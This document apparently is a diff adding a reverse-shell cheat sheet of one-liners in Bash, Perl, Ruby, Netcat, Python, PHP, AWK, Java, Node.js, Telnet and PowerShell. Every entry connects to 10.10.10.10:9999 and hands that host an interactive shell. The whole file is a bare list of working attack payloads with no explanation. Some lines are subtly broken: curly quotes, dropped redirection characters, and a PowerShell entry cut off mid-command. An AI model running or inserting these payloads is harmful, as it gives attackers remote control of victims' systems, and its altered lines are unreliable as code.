@@ -1,0 +1,49 @@
+BASH REVERSE SHELLS
+1) bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
+2) 0<&196;exec 196<>/dev/tcp/10.10.10.10/9999; sh <&196 >&196 2>&196
+3) exec 5<> /dev/tcp/10.10.10.10/9999; cat <&5 | while read line; do $line 2>&5>&5; done
+__________________________________________________________________
+PERL REVERSE SHELLS
+1) perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”10.10.10.10:9999");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
+2) perl -e ‘use Socket;$i=”10.10.10.10";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
+3) perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”10.10.10.10:9999");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
+___________________________________________________________________
+RUBY REVERSE SHELLS
+1) ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“10.10.10.10”,”9999");while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
+2) ruby -rsocket -e’f=TCPSocket.open(“10.10.10.10”,9999).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
+3) ruby -rsocket -e ‘c=TCPSocket.new(“10.10.10.10”,”9999");while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
+___________________________________________________________________
+NETCAT REVERSE SHELLS
+1) nc -c /bin/sh 10.10.10.10 9999
+2) nc -e /bin/sh 10.10.10.10 9999
+3) /bin/sh | nc 10.10.10.10 9999
+4) rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9999 >/tmp/f
+5) rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.10 9999 0/tmp/p
+6) ncat 10.10.10.10 9999 -e /bin/sh
+___________________________________________________________________
+PYTHON REVERSE SHELLS
+1) python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+2) python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/sh”)’
+___________________________________________________________________
+PHP REVERSE SHELLS
+1) php -r ‘$sock=fsockopen(“10.10.10.10”,9999);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+2) php -r ‘$s=fsockopen(“10.10.10.10”,9999);shell_exec(“/bin/sh -i <&3 >&3 2>&3”);’
+3) php -r ‘$s=fsockopen(“10.10.10.10”,9999);`/bin/sh -i <&3 >&3 2>&3`;’
+4) php -r ‘$s=fsockopen(“10.10.10.10”,9999);system(“/bin/sh -i <&3 >&3 2>&3”);’
+5) php -r ‘$s=fsockopen(“10.10.10.10”,9999);popen(“/bin/sh -i <&3 >&3 2>&3”, “r”);’
+___________________________________________________________________
+AWK Reverse Shell
+awk ‘BEGIN {s = “/inet/tcp/0/10.10.10.10/9999”; while(42) { do{ printf “shell>” |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != “exit”) close(s); }}’ /dev/null
+__________________________________________________________________
+JAVA REVERSE SHELLS
+r = Runtime.getRuntime();p = r.exec([“/bin/sh”,”-c”,”exec 5<>/dev/tcp/10.10.10.10/9999;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[]);p.waitFor();
+___________________________________________________________________
+NODE.JS REVERSE SHELL
+(function(){var net=require(“net”),cp=require(“child_process”),sh=cp.spawn(“/bin/sh”,[]);var client=new net.Socket();client.connect(9999,”10.10.10.10",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
+___________________________________________________________________
+TELNET REVERSE SHELLS
+1) rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 9999 0/tmp/p
+2) rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 10.10.10.10 9999 > /tmp/f
+___________________________________________________________________
+POWERSHELL REVERSE SHELLS
+1) powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(“10.10.10.10”,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($
